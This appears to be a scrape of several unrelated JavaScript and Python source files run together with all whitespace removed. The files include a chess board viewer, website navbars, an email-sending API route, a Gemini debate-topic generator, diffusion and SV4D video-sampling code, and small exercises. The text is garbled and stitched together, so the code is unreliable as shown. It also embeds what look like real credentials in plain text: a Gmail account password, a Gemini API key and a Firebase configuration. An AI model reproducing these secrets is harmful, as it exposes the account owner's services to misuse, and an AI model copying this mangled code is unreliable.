Rxf6Bc519.Rxe6+Kd720.Kh1Bxe321.Rxe3Rhf822.h3Rf523.Nxh7Rh824.Rf3Rh525.Nf6+1-0`;constgetFenArr=(board)=>{consttempBoard=newChess();returnboard.history().map((move)=>{tempBoard.move(move);returntempBoard.fen();});};const[fen,setFen]=useState('start');const[i,setI]=useState(0);constboard=newChess();board.loadPgn(pgn);constfenArr=['start',...getFenArr(board)];consthandleKeyDown=(e)=>{switch(e.key){case'ArrowRight':setI(Math.min(i+1,fenArr.length-1));break;case'ArrowLeft':setI(Math.max(i-1,0));break;default:break;}setFen(fenArr[i]);};return(<divid='container'tabIndex={0}onKeyDown={handleKeyDown}><ChessboardarePiecesDraggable={false}position={fen}/></div>);};exportdefaultApp;import{Fragment}from"react";import{Disclosure,Menu,Transition}from"@headlessui/react";import{Bars3Icon,BellIcon,XMarkIcon}from"@heroicons/react/24/outline";importLinkfrom"next/link";importImagefrom"next/image"constnavigation=[{name:"Dashboard",href:"https://dashboard.ccadeca.co/",current:false},{name:"About",href:"#about",current:false},{name:"Calendar",href:"#Calendar",current:false},{name:"FAQs",href:"#FAQs",current:false},];functionclassNames(...classes){returnclasses.filter(Boolean).join("");}exportdefaultfunctionExample(){return(<Disclosureas="nav"className="">{({open})=>(<><divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8"><divclassName="relativeflexh-16items-centerjustify-between"><divclassName="absoluteinset-y-0left-0flexitems-centersm:hidden">{/*Mobilemenubutton*/}<Disclosure.ButtonclassName="relativeinline-flexitems-centerjustify-centerrounded-mdp-2text-gray-400focus:outline-nonefocus:ring-2focus:ring-insetfocus:ring-white"><spanclassName="absolute-inset-0.5"/><spanclassName="sr-only">Openmainmenu</span>{open?(<XMarkIconclassName="blockh-6w-6"aria-hidden="true"/>):(<Bars3IconclassName="blockh-6w-6"aria-hidden="true"/>)}</Disclosure.Button></div><divclassName="flexflex-1items-centerjustify-centersm:items-stretchsm:justify-start"><divclassName="flexflex-shrink-0items-center"><ImageclassName="h-8w-auto"src="/favicon.png"alt="YourCompany"width={500}height={500}/><spanclassName="text-blue-500font-semiboldrounded-mdpx-3py-2text-base">EnduraScribe</span></div><divclassName="hiddensm:ml-6sm:block"><divclassName="flexspace-x-4">{navigation.map((item)=>(<akey={item.name}href={item.href}className={classNames("text-gray-500","rounded-mdpx-3py-2text-basefont-medium")}aria-current={item.current?"page":undefined}>{item.name}</a>))}</div></div></div><divclassName="absoluteinset-y-0right-0flexitems-centerpr-2sm:staticsm:inset-autosm:ml-6sm:pr-0"><Linkhref="https://docs.google.com/forms/d/e/1FAIpQLScOLfkmFsTZop_cca565deD4huYJtvuWMTzla1VEDlknbZl-w/viewform?vc=0&c=0&w=1&flr=0"><buttontype="button"className="rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-1.5text-basefont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600">SignUp</button></Link>{/*Profiledropdown*/}</div></div></div><Disclosure.PanelclassName="sm:hidden"><divclassName="space-y-1px-2pb-3pt-2">{navigation.map((item)=>(<Disclosure.Buttonkey={item.name}as="a"href={item.href}className={classNames("text-gray-500","blockrounded-mdpx-3py-2text-basefont-medium")}aria-current={item.current?"page":undefined}>{item.name}</Disclosure.Button>))}</div></Disclosure.Panel></>)}</Disclosure>);}importnodemailerfrom'nodemailer';importdotenvfrom'dotenv';dotenv.config();exportdefaultasyncfunctionhandler(req,res){if(req.method==='POST'){const{username,timestamp}=req.body;consttransporter=nodemailer.createTransport({service:'gmail',//Oranotherserviceifapplicableauth:{user:'nathandai2000@gmail.com',pass:'ggewfwkdgtzmmlwn',},});constmailOptions={from:'nathandai2000@gmail.com',to:'7607172199@msg.fi.google.com',subject:'',//Nosubjecttext:`Username:${username}\nTimestamp:${timestamp}`,//Emailbody};try{awaittransporter.sendMail(mailOptions);res.status(200).json({success:true});}catch(error){console.error('Errorsendingemail:',error);res.status(500).json({success:false,error:'Failedtosendemail'});}}else{//Handleanynon-POSTrequestsres.setHeader('Allow',['POST']);res.status(405).end(`Method${req.method}NotAllowed`);}}import{Link}from'react-router-dom';importBoardfrom'./Board';importGameUploadFormfrom'./GameUploadForm';import'../index.css';constPublic=()=>{return(<><nav><ulclassName='navbar'><liclassName='navbar-item'><Linkto='/login'className='button'>Login</Link></li></ul></nav><divid='container'><divid='pgn-upload'><GameUploadForm/></div><divid='board'><Board/></div></div></>);};exportdefaultPublic;'useclient';import{useState}from'react';import{GoogleGenerativeAI}from'@google/generative-ai';import{Inter}from'next/font/google'constinter=Inter({subsets:['latin']})constHome=()=>{const[topic,setTopic]=useState('Clickthebuttontogenerateatopic!');const[viewpoint1,setViewpoint1]=useState('');const[viewpoint2,setViewpoint2]=useState('');const[prepTime,setPrepTime]=useState('30');const[speakingLength,setSpeakingLength]=useState('30');const[isTopicGenerated,setIsTopicGenerated]=useState(false);const[isLoading,setIsLoading]=useState(false);const[currentStep,setCurrentStep]=useState(1);//ConfiguretheGeminiAPIclientconstgenAI=newGoogleGenerativeAI('AIzaSyC1TqhOqsiYuMLilytOF7cBGgh8NEiPtRQ');consttopics=['SocialMedia','Globalization','ClimateChange','EducationSystem','ArtificialIntelligence','Healthcare','FreedomofSpeech','EconomicInequality','TechnologyandSociety','Privacyvs.Security','Immigration','Work-LifeBalance','EnvironmentalSustainability','Censorship','GenderEquality','SpaceExploration','Capitalismvs.Socialism','AnimalRights','GeneticEngineering','CulturalAppropriation','GunControl','PoliticalPolarization','Cryptocurrency','Vaccination','PublicSurveillance','UniversalBasicIncome','InternetCensorship','RenewableEnergy','Consumerism','EthicsofAutonomousVehicles',];constgetRandomChoice=(array)=>{returnarray[Math.floor(Math.random()*array.length)];}constschema={description:'Adebatabletopicwithtwosidestotheargument.',type:'object',properties:{question:{type:'string',description:'Thedebatabletopicquestion.',},viewpoint1:{type:'string',description:'Thefirstviewpointonthetopic.',},viewpoint2:{type:'string',description:'Thesecondviewpointonthetopic.',},},required:['question','viewpoint1','viewpoint2'],};constmodel=genAI.getGenerativeModel({model:'gemini-1.5-pro-latest',generationConfig:{responseMimeType:'application/json',responseSchema:schema,temperature:2},});//GenerateatopicusingtheGeminiAPIconstgenerateTopic=async()=>{setIsLoading(true);try{consttopic=getRandomChoice(topics);console.log(topic);constprompt=`iamtryingtopracticeimpromptuspeaking.generateonespeakingquestionabout${topic}thatiswellknownanddebatableandhavetwosidestotheargumentandnocorrectanswer.hereisanexampleofquestionsthatyoushouldgenerate.inyouractualresponse,onlyoutputasinglequestion:`;constresult=awaitmodel.generateContent(prompt);console.log(result.response.text());constdata=JSON.parse(result.response.text().trim());setTopic(data.question);setViewpoint1(data.viewpoint1);setViewpoint2(data.viewpoint2);setIsTopicGenerated(true);}catch(error){console.error('Errorgeneratingtopic:',error);}finally{setIsLoading(false);}};consthandleNextStep=()=>{setCurrentStep(2);};consthandleFinalSubmit=()=>{localStorage.setItem('topic',topic);localStorage.setItem('viewpoint1',viewpoint1);localStorage.setItem('viewpoint2',viewpoint2);localStorage.setItem('prepTime',prepTime);localStorage.setItem('speakingLength',speakingLength);window.location.href='/notes';};consthandleBack=()=>{setCurrentStep(1);};return(<><divclassName="bg-emoji-pattern"></div><divclassName={`flexflex-colitems-centerjustify-centermin-h-screenp-8content-wrapper${inter.className}`}><divclassName='bg-whiterounded-xlshadow-lgp-6w-fullmax-w-xlrelative'>{currentStep===1?(<>{isTopicGenerated?(<divclassName='bg-gray-50p-4mb-4rounded-lgshadow-sm'><h2className='text-xlfont-boldtext-leftmb-3'>{topic}</h2><divclassName='space-y-3'><divclassName='bg-whitep-3rounded-mdshadow-sm'><h3className='text-mdfont-semiboldmb-1'>Viewpoint1:</h3><pclassName='text-sm'>{viewpoint1}</p></div><divclassName='bg-whitep-3rounded-mdshadow-sm'><h3className='text-mdfont-semiboldmb-1'>Viewpoint2:</h3><pclassName='text-sm'>{viewpoint2}</p></div></div></div>):(<divclassName='text-centermb-4text-gray-600'>Clickthebuttonbelowtogenerateatopic!</div>)}<buttononClick={generateTopic}className='w-fullbg-sky-500hover:bg-sky-400text-whitefont-boldpy-3px-4rounded-mdshadow-mdtransitionduration-300ease-in-outtransformhover:scale-102flexitems-centerjustify-centermb-4'disabled={isLoading}>{isLoading?(<><svgclassName="animate-spin-ml-1mr-2h-5w-5text-white"xmlns="http://www.w3.org/2000/svg"fill="none"viewBox="002424"><circleclassName="opacity-25"cx="12"cy="12"r="10"stroke="currentColor"strokeWidth="4"></circle><pathclassName="opacity-75"fill="currentColor"d="M412a880018-8V0C5.373005.373012h4zm25.291A7.9627.962001412H0c03.0421.1355.82437.938l3-2.647z"></path></svg>Generating...</>):(<>GenerateTopic<spanrole="img"aria-label="Brain"className="ml-2">🤯</span></>)}</button><buttonclassName={`w-full${isTopicGenerated?'bg-green-500hover:bg-green-400hover:scale-102':'bg-gray-400cursor-not-allowed'}text-whitefont-boldpy-3px-8rounded-mdshadow-mdtransitionduration-300ease-in-outtransformflexitems-centerjustify-center`}onClick={handleNextStep}disabled={!isTopicGenerated}>Next<svgxmlns="http://www.w3.org/2000/svg"className="h-5w-5ml-2"viewBox="002020"fill="currentColor"><pathfillRule="evenodd"d="M10.2933.293a110011.4140l66a1100101.414l-66a11001-1.414-1.414L14.58611H3a110110-2h11.586l-4.293-4.293a110010-1.414z"clipRule="evenodd"/></svg></button></>):(<><divclassName='bg-gray-50p-4mb-6rounded-lgshadow-sm'><h2className='text-xlfont-boldtext-leftmb-3'>{topic}</h2><divclassName='space-y-3'><divclassName='bg-whitep-3rounded-mdshadow-sm'><h3className='text-mdfont-semiboldmb-1'>Viewpoint1:</h3><pclassName='text-sm'>{viewpoint1}</p></div><divclassName='bg-whitep-3rounded-mdshadow-sm'><h3className='text-mdfont-semiboldmb-1'>Viewpoint2:</h3><pclassName='text-sm'>{viewpoint2}</p></div></div></div><divclassName='space-y-4mb-6'><divclassName='flexflex-col'><labelclassName='text-mdfont-semiboldmb-2'>PreparationTime(seconds):</label><inputtype='number'value={prepTime}onChange={(e)=>setPrepTime(e.target.value)}className='p-2borderborder-gray-300rounded-mdw-full'placeholder='Enterpreparationtime'/></div><divclassName='flexflex-col'><labelclassName='text-mdfont-semiboldmb-2'>SpeakingLength(seconds):</label><inputtype='number'value={speakingLength}onChange={(e)=>setSpeakingLength(e.target.value)}className='p-2borderborder-gray-300rounded-mdw-full'placeholder='Enterspeakinglength'/></div></div><divclassName='flexjustify-between'><buttononClick={handleBack}className='bg-gray-300hover:bg-gray-400text-gray-800font-boldpy-2px-4rounded-mdshadow-mdtransitionduration-300ease-in-outtransformhover:scale-102'>Back</button><buttonclassName={`${prepTime&&speakingLength?'bg-green-500hover:bg-green-400hover:scale-102':'bg-gray-400cursor-not-allowed'}text-whitefont-boldpy-2px-8rounded-mdshadow-mdtransitionduration-300ease-in-outtransformflexitems-center`}onClick={handleFinalSubmit}disabled={!prepTime||!speakingLength}>Next<svgxmlns="http://www.w3.org/2000/svg"className="h-5w-5ml-2"viewBox="002020"fill="currentColor"><pathfillRule="evenodd"d="M10.2933.293a110011.4140l66a1100101.414l-66a11001-1.414-1.414L14.58611H3a110110-2h11.586l-4.293-4.293a110010-1.414z"clipRule="evenodd"/></svg></button></div></>)}</div></div></>);};exportdefaultHome;fromabcimportabstractmethodfromfunctoolsimportpartialimportnumpyasnpimporttorchfrom...modules.diffusionmodules.utilimportmake_beta_schedulefrom...utilimportappend_zerodefgenerate_roughly_equally_spaced_steps(num_substeps:int,max_step:int)->np.ndarray:returnnp.linspace(max_step-1,0,num_substeps,endpoint=False).astype(int)[::-1]classDiscretization:def__call__(self,n,do_append_zero=True,device="cpu",flip=False):sigmas=self.get_sigmas(n,device=device)sigmas=append_zero(sigmas)ifdo_append_zeroelsesigmasreturnsigmasifnotflipelsetorch.flip(sigmas,(0,))@abstractmethoddefget_sigmas(self,n,device):passclassEDMDiscretization(Discretization):def__init__(self,sigma_min=0.002,sigma_max=80.0,rho=7.0):self.sigma_min=sigma_minself.sigma_max=sigma_maxself.rho=rhodefget_sigmas(self,n,device="cpu"):ramp=torch.linspace(0,1,n,device=device)min_inv_rho=self.sigma_min**(1/self.rho)max_inv_rho=self.sigma_max**(1/self.rho)sigmas=(max_inv_rho+ramp*(min_inv_rho-max_inv_rho))**self.rhoreturnsigmasclassLegacyDDPMDiscretization(Discretization):def__init__(self,linear_start=0.00085,linear_end=0.0120,num_timesteps=1000,):super().__init__()self.num_timesteps=num_timestepsbetas=make_beta_schedule("linear",num_timesteps,linear_start=linear_start,linear_end=linear_end)alphas=1.0-betasself.alphas_cumprod=np.cumprod(alphas,axis=0)self.to_torch=partial(torch.tensor,dtype=torch.float32)defget_sigmas(self,n,device="cpu"):ifn<self.num_timesteps:timesteps=generate_roughly_equally_spaced_steps(n,self.num_timesteps)alphas_cumprod=self.alphas_cumprod[timesteps]elifn==self.num_timesteps:alphas_cumprod=self.alphas_cumprodelse:raiseValueErrorto_torch=partial(torch.tensor,dtype=torch.float32,device=device)sigmas=to_torch((1-alphas_cumprod)/alphas_cumprod)**0.5returntorch.flip(sigmas,(0,))import{Disclosure}from'@headlessui/react';import{Bars3Icon,XMarkIcon}from'@heroicons/react/24/outline';importImagefrom'next/image';importrouterfrom'next/router';importLinkfrom'next/link';constnavigation=[{name:'Home',href:'/',current:false},{name:'Shop',href:'/shop',current:false},{name:'Order',href:'/order',current:false},{name:'Contact',href:'/contact',current:false},{name:'About',href:'/about',current:false},];functionclassNames(...classes){returnclasses.filter(Boolean).join('');}constNavbar=()=>{return(<Disclosureas='nav'className='bg-white'>{({open})=>(<><divclassName='mx-automax-w-7xlpx-2sm:px-6lg:px-8'><divclassName='relativeflexh-16items-centerjustify-between'><divclassName='absoluteinset-y-0left-0flexitems-centersm:hidden'>{/*Mobilemenubutton*/}<Disclosure.ButtonclassName='relativeinline-flexitems-centerjustify-centerrounded-mdp-2text-gray-400focus:outline-nonefocus:ring-2focus:ring-insetfocus:ring-white'><spanclassName='absolute-inset-0.5'/><spanclassName='sr-only'>Openmainmenu</span>{open?(<XMarkIconclassName='blockh-6w-6'aria-hidden='true'/>):(<Bars3IconclassName='blockh-6w-6'aria-hidden='true'/>)}</Disclosure.Button></div><divclassName='flexflex-1items-centerjustify-centersm:items-stretchsm:justify-start'><divclassName='flexflex-shrink-0items-center'><Linkhref='/'><ImageclassName='h-8w-autocursor-pointer'src='/small_banner.png'alt='YourCompany'width={500}height={500}/></Link></div><divclassName='hiddensm:ml-6sm:block'><divclassName='flexspace-x-4'>{navigation.map((item)=>(<akey={item.name}href={item.href}className={classNames('text-gray-500','rounded-mdpx-3py-2text-basefont-medium')}aria-current={item.current?'page':undefined}>{item.name}</a>))}</div></div></div></div></div><Disclosure.PanelclassName='sm:hidden'><divclassName='space-y-1px-2pb-3pt-2'>{navigation.map((item)=>(<Disclosure.Buttonkey={item.name}as='a'href={item.href}className={classNames('text-gray-500','blockrounded-mdpx-3py-2text-basefont-medium')}aria-current={item.current?'page':undefined}>{item.name}</Disclosure.Button>))}</div></Disclosure.Panel></>)}</Disclosure>);};exportdefaultNavbar;constexpress=require('express');constrouter=express.Router();constgamesController=require('../controllers/gamesController');router.get('/',gamesController.getAllGames);router.get('/:id',gamesController.getGameById);router.post('/',gamesController.createNewGame);router.patch('/',gamesController.updateGame);router.delete('/',gamesController.deleteGame);module.exports=router;import{useRouter}from'next/router';constUnauthorized=()=>{constrouter=useRouter();//FunctiontohandleredirecttohomeorloginpageconsthandleRedirect=()=>{router.push('/');//Redirecttothehomepageorchangeto'/login'ifneeded};return(<divclassName='flexflex-colitems-centerjustify-centermin-h-screenbg-gray-100'><h1className='text-4xlfont-boldtext-red-600mb-4'>Unauthorized</h1><pclassName='text-lgtext-gray-700mb-6'>Youarenotauthorizedtoviewthispage.</p><buttononClick={handleRedirect}className='px-6py-2text-whitebg-blue-500rounded-mdhover:bg-blue-600focus:outline-nonefocus:ring-2focus:ring-blue-400focus:ring-opacity-75mb-6'>GoBack</button><pclassName='text-mdtext-gray-600'>Pleasecontact{''}<ahref='mailto:nathan.dai@berkeley.edu'className='text-blue-500underline'>nathan.dai@berkeley.edu</a>{''}forinquiriesaboutpurchasingaschoollicenseoranindividuallicense.</p></div>);};exportdefaultUnauthorized;import{Fragment}from"react";import{Disclosure,Menu,Transition}from"@headlessui/react";import{Bars3Icon,BellIcon,XMarkIcon}from"@heroicons/react/24/outline";importLinkfrom"next/link";importImagefrom"next/image"constnavigation=[{name:"Dashboard",href:"https://dashboard.ccadeca.co/",current:false},{name:"About",href:"#about",current:false},{name:"Calendar",href:"#Calendar",current:false},{name:"FAQs",href:"#FAQs",current:false},];functionclassNames(...classes){returnclasses.filter(Boolean).join("");}exportdefaultfunctionExample(){return(<Disclosureas="nav"className="">{({open})=>(<><divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8"><divclassName="relativeflexh-16items-centerjustify-between"><divclassName="absoluteinset-y-0left-0flexitems-centersm:hidden">{/*Mobilemenubutton*/}<Disclosure.ButtonclassName="relativeinline-flexitems-centerjustify-centerrounded-mdp-2text-gray-400focus:outline-nonefocus:ring-2focus:ring-insetfocus:ring-white"><spanclassName="absolute-inset-0.5"/><spanclassName="sr-only">Openmainmenu</span>{open?(<XMarkIconclassName="blockh-6w-6"aria-hidden="true"/>):(<Bars3IconclassName="blockh-6w-6"aria-hidden="true"/>)}</Disclosure.Button></div><divclassName="flexflex-1items-centerjustify-centersm:items-stretchsm:justify-start"><divclassName="flexflex-shrink-0items-center"><ImageclassName="h-8w-auto"src="/DECA-Diamond-1.png"alt="YourCompany"width={500}height={500}/><spanclassName="text-blue-500font-semiboldrounded-mdpx-3py-2text-base">CCADECA</span></div><divclassName="hiddensm:ml-6sm:block"><divclassName="flexspace-x-4">{navigation.map((item)=>(<akey={item.name}href={item.href}className={classNames("text-gray-500","rounded-mdpx-3py-2text-basefont-medium")}aria-current={item.current?"page":undefined}>{item.name}</a>))}</div></div></div><divclassName="absoluteinset-y-0right-0flexitems-centerpr-2sm:staticsm:inset-autosm:ml-6sm:pr-0"><Linkhref="https://docs.google.com/forms/d/e/1FAIpQLScOLfkmFsTZop_cca565deD4huYJtvuWMTzla1VEDlknbZl-w/viewform?vc=0&c=0&w=1&flr=0"><buttontype="button"className="rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-1.5text-basefont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600">SignUp</button></Link>{/*Profiledropdown*/}</div></div></div><Disclosure.PanelclassName="sm:hidden"><divclassName="space-y-1px-2pb-3pt-2">{navigation.map((item)=>(<Disclosure.Buttonkey={item.name}as="a"href={item.href}className={classNames("text-gray-500","blockrounded-mdpx-3py-2text-basefont-medium")}aria-current={item.current?"page":undefined}>{item.name}</Disclosure.Button>))}</div></Disclosure.Panel></>)}</Disclosure>);}importunittestclassSolution:defsort(self,nums:list[int],k:int)->list[int]:counts={}forninnums:counts[n]=counts.get(n,0)+1return[i[0]foriinsorted(counts.items(),key=lambdax:x[1],reverse=True)[:k]]deftopKFrequent(self,nums:list[int],k:int)->list[int]:length=len(nums)counts={}forninnums:counts[n]=counts.get(n,0)+1inverse_counts=[[]for_inrange(length+1)]forn,countincounts.items():inverse_counts[count].append(n)top=[]foriinrange(length,-1,-1):if(len(top)==k):break#addallnumbersbecauseuniquesolutionisguaranteedtop+=inverse_counts[i]#ifuniquesolutionisnotguaranteedandanysolutionisacceptable#while(len(top)<kandlen(inverse_counts[i])>0):#top.append(inverse_counts[i].pop())returntopclassTestSolution(unittest.TestCase):deftest_topKFrequent(self):s=Solution()self.assertEqual(s.topKFrequent([1,1,1,2,2,3],2),[1,2])self.assertEqual(s.topKFrequent([1],1),[1])unittest.main()#Wordcountdeflength(essay):returnlen(essay)importpy3createtorrentpath=//ImportthefunctionsyouneedfromtheSDKsyouneedimport{initializeApp}from"firebase/app";import{getFirestore}from"firebase/firestore";//Yourwebapp'sFirebaseconfigurationconstfirebaseConfig={apiKey:"AIzaSyDicya6nx4UNLEZAt8WmTdNI8yAhCgF3PM",authDomain:"turd-a2bd6.firebaseapp.com",projectId:"turd-a2bd6",storageBucket:"turd-a2bd6.appspot.com",messagingSenderId:"723601616273",appId:"1:723601616273:web:edf54b0f0836f892b07e30"};//InitializeFirebaseconstapp=initializeApp(firebaseConfig);constdb=getFirestore(app);exportdefaultdb;import{Line}from'rc-progress';exportconstProgressBar=({imove,fenArr,comments})=>{//letcomment;//for(leti=0;i<comments.length;i++){//comment=comments[i];//}return(<Linepercent={(imove/(fenArr.length-1))*100}strokeWidth={1.75}strokeColor='#10B981'/>);};#Standardlibrariesimportnumpyasnpimportmatplotlib.pyplotaspltimportpandasaspd#ImportingtheKeraslibrariesandpackagesfromkeras.modelsimportSequentialfromkeras.layersimportDensefromkeras.layersimportLSTMfromkeras.layersimportDropout#GetmodeldefgetModel(X_train):model=Sequential()model.add(LSTM(units=50,return_sequences=True,input_shape=(X_train.shape[1],6)))model.add(Dropout(0.2))model.add(LSTM(units=50,return_sequences=True))model.add(Dropout(0.2))model.add(LSTM(units=50,return_sequences=True))model.add(Dropout(0.2))model.add(LSTM(units=50))model.add(Dropout(0.2))model.add(Dense(units=6))model.compile(optimizer="adam",loss='mean_squared_error')returnmodelimportsyssys.stdin=open('delete.in')n,q=map(int,input().split())separators=input().split()statements=[Trueif(separator:=separators.pop(i))=='true'elseFalseforiinrange(n//2+1)]forward=[statements[0]]backward=[statements[-1]]foriinrange(len(separators)):forward.append(forward[-1]andstatements[i+1]ifseparators[i]=='and'elseforward[-1]orstatements[i+1])i=len(separators)-1-ibackward.append(statements[i]andbackward[-1]ifseparators[i]=='and'elsestatements[i]orbackward[-1])print(forward,backward)importosimportsysfromglobimportglobfromtypingimportList,Optional,Unionfromtqdmimporttqdmsys.path.append(os.path.realpath(os.path.join(os.path.dirname(__file__),"../../")))importnumpyasnpimporttorchfromfireimportFirefromsgm.modules.encoders.modulesimportVideoPredictionEmbedderWithEncoderfromscripts.demo.sv4d_helpersimport(decode_latents,load_model,initial_model_load,read_video,run_img2vid,prepare_sampling,prepare_inputs,do_sample_per_step,sample_sv3d,save_video,preprocess_video,)defsample(input_path:str="assets/test_video.mp4",#Caneitherbeimagefileorfolderwithimagefilesoutput_folder:Optional[str]="outputs/sv4d",num_steps:Optional[int]=20,sv3d_version:str="sv3d_u",#sv3d_uorsv3d_pimg_size:int=576,#imageresolutionfps_id:int=6,motion_bucket_id:int=127,cond_aug:float=1e-5,seed:int=23,encoding_t:int=8,#Numberofframesencodedatatime!ThiseatsmostVRAM.Reduceifnecessary.decoding_t:int=4,#Numberofframesdecodedatatime!ThiseatsmostVRAM.Reduceifnecessary.device:str="cuda",elevations_deg:Optional[Union[float,List[float]]]=10.0,azimuths_deg:Optional[List[float]]=None,image_frame_ratio:Optional[float]=0.917,verbose:Optional[bool]=False,remove_bg:bool=False,):"""Simplescripttogeneratemultiplenovel-viewvideosconditionedonavideo`input_path`ormultipleframes,oneforeachimagefileinfolder`input_path`.IfyourunoutofVRAM,trydecreasing`decoding_t`and`encoding_t`."""#SetmodelconfigT=5#numberofframespersampleV=8#numberofviewspersampleF=8#vaefactortodownsizeimage->latentC=4H,W=img_size,img_sizen_frames=21#numberofinputandoutputvideoframesn_views=V+1#numberofoutputvideoviews(1inputview+8novelviews)n_views_sv3d=21subsampled_views=np.array([0,2,5,7,9,12,14,16,19])#subsample(V+1=)9(uniform)viewsfrom21SV3Dviewsmodel_config="scripts/sampling/configs/sv4d.yaml"version_dict={"T":T*V,"H":H,"W":W,"C":C,"f":F,"options":{"discretization":1,"cfg":3.0,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":5,"num_steps":num_steps,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise","cond_view","cond_motion",],"additional_guider_kwargs":{"additional_cond_keys":["cond_view","cond_motion"]},},}torch.manual_seed(seed)os.makedirs(output_folder,exist_ok=True)#Readinputvideoframesi.e.imagesatview0print(f"Reading{input_path}")processed_input_path=preprocess_video(input_path,remove_bg=remove_bg,n_frames=n_frames,W=W,H=H,output_folder=output_folder,image_frame_ratio=image_frame_ratio,)images_v0=read_video(processed_input_path,n_frames=n_frames,device=device)#Getcameraviewpointsifisinstance(elevations_deg,float)orisinstance(elevations_deg,int):elevations_deg=[elevations_deg]*n_views_sv3dassert(len(elevations_deg)==n_views_sv3d),f"Pleaseprovide1value,oralistof{n_views_sv3d}valuesforelevations_deg!Given{len(elevations_deg)}"ifazimuths_degisNone:azimuths_deg=np.linspace(0,360,n_views_sv3d+1)[1:]%360assert(len(azimuths_deg)==n_views_sv3d),f"Pleaseprovidealistof{n_views_sv3d}valuesforazimuths_deg!Given{len(azimuths_deg)}"polars_rad=np.array([np.deg2rad(90-e)foreinelevations_deg])azimuths_rad=np.array([np.deg2rad((a-azimuths_deg[-1])%360)forainazimuths_deg])#Samplemulti-viewimagesofthefirstframeusingSV3Di.e.imagesattime0images_t0=sample_sv3d(images_v0[0],n_views_sv3d,num_steps,sv3d_version,fps_id,motion_bucket_id,cond_aug,decoding_t,device,polars_rad,azimuths_rad,verbose,)images_t0=torch.roll(images_t0,1,0)#moveconditioningimagetofirstframe#Initializeimagematriximg_matrix=[[None]*n_viewsfor_inrange(n_frames)]fori,vinenumerate(subsampled_views):img_matrix[0][i]=images_t0[v].unsqueeze(0)fortinrange(n_frames):img_matrix[t][0]=images_v0[t]base_count=len(glob(os.path.join(output_folder,"*.mp4")))//12save_video(os.path.join(output_folder,f"{base_count:06d}_t000.mp4"),img_matrix[0],)save_video(os.path.join(output_folder,f"{base_count:06d}_v000.mp4"),[img_matrix[t][0]fortinrange(n_frames)],)#LoadSV4Dmodelmodel,filter=load_model(model_config,device,version_dict["T"],num_steps,verbose,)model=initial_model_load(model)forembinmodel.conditioner.embedders:ifisinstance(emb,VideoPredictionEmbedderWithEncoder):emb.en_and_decode_n_samples_a_time=encoding_tmodel.en_and_decode_n_samples_a_time=decoding_t#Interleavedsamplingforanchorframest0,v0=0,0frame_indices=np.arange(T-1,n_frames,T-1)#[4,8,12,16,20]view_indices=np.arange(V)+1print(f"Samplinganchorframes{frame_indices}")image=img_matrix[t0][v0]cond_motion=torch.cat([img_matrix[t][v0]fortinframe_indices],0)cond_view=torch.cat([img_matrix[t0][v]forvinview_indices],0)polars=polars_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=azimuths_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=(azims-azimuths_rad[v0])%(torch.pi*2)samples=run_img2vid(version_dict,model,image,seed,polars,azims,cond_motion,cond_view,decoding_t)samples=samples.view(T,V,3,H,W)fori,tinenumerate(frame_indices):forj,vinenumerate(view_indices):ifimg_matrix[t][v]isNone:img_matrix[t][v]=samples[i,j][None]*2-1#Densesamplingfortherestprint(f"Samplingdenseframes:")fort0intqdm(np.arange(0,n_frames-1,T-1)):#[0,4,8,12,16]frame_indices=t0+np.arange(T)print(f"Samplingdenseframes{frame_indices}")latent_matrix=torch.randn(n_frames,n_views,C,H//F,W//F).to("cuda")polars=polars_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=azimuths_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=(azims-azimuths_rad[v0])%(torch.pi*2)#alternatebetweenforwardandbackwardconditioningforward_inputs,forward_frame_indices,backward_inputs,backward_frame_indices=prepare_inputs(frame_indices,img_matrix,v0,view_indices,model,version_dict,seed,polars,azims)forstepintqdm(range(num_steps)):ifstep%2==1:c,uc,additional_model_inputs,sampler=forward_inputsframe_indices=forward_frame_indiceselse:c,uc,additional_model_inputs,sampler=backward_inputsframe_indices=backward_frame_indicesnoisy_latents=latent_matrix[frame_indices][:,view_indices].flatten(0,1)samples=do_sample_per_step(model,sampler,noisy_latents,c,uc,step,additional_model_inputs,)samples=samples.view(T,V,C,H//F,W//F)fori,tinenumerate(frame_indices):forj,vinenumerate(view_indices):latent_matrix[t,v]=samples[i,j]img_matrix=decode_latents(model,latent_matrix,img_matrix,frame_indices,view_indices,T)#Saveoutputvideosforvinview_indices:vid_file=os.path.join(output_folder,f"{base_count:06d}_v{v:03d}.mp4")print(f"Saving{vid_file}")save_video(vid_file,[img_matrix[t][v]fortinrange(n_frames)])#Savediagonalvideodiag_frames=[img_matrix[t][(t//(n_frames//n_views))%n_views]fortinrange(n_frames)]vid_file=os.path.join(output_folder,f"{base_count:06d}_diag.mp4")print(f"Saving{vid_file}")save_video(vid_file,diag_frames)if__name__=="__main__":Fire(sample)fromabcimportabstractmethodfromtypingimportDict,Union,List,Optional,CallablefromomegaconfimportListConfig,DictConfigfrom..datapipelineimporttime_measure,make_callableclassAbstractFilter:def__init__(self,exclude_keys:Optional[Union[List[str],ListConfig,str]]=None,verbose:bool=False,):ifnotexclude_keys:exclude_keys=[]ifisinstance(exclude_keys,str):exclude_keys=[exclude_keys]self.exclude_keys=exclude_keysself.verbose=verbosedefskip_this_sample(self,sample:Dict)->bool:res=any(map(lambdax:xinsample["__url__"],self.exclude_keys))delsamplereturnres@abstractmethoddef__call__(self,sample:Dict)->bool:raiseNotImplementedError("AbstractFiltershouldnotbecalledbutoverwritten")classLambdaFilter(AbstractFilter):def__init__(self,keys:Union[str,List[str],ListConfig],fn:Union[Dict,DictConfig,Callable],*args,**kwargs):super().__init__(*args,**kwargs)ifisinstance(keys,str):keys=[keys]self.keys=keysifisinstance(fn,Union[Dict,DictConfig]):fn=make_callable(fn)self.fn=fn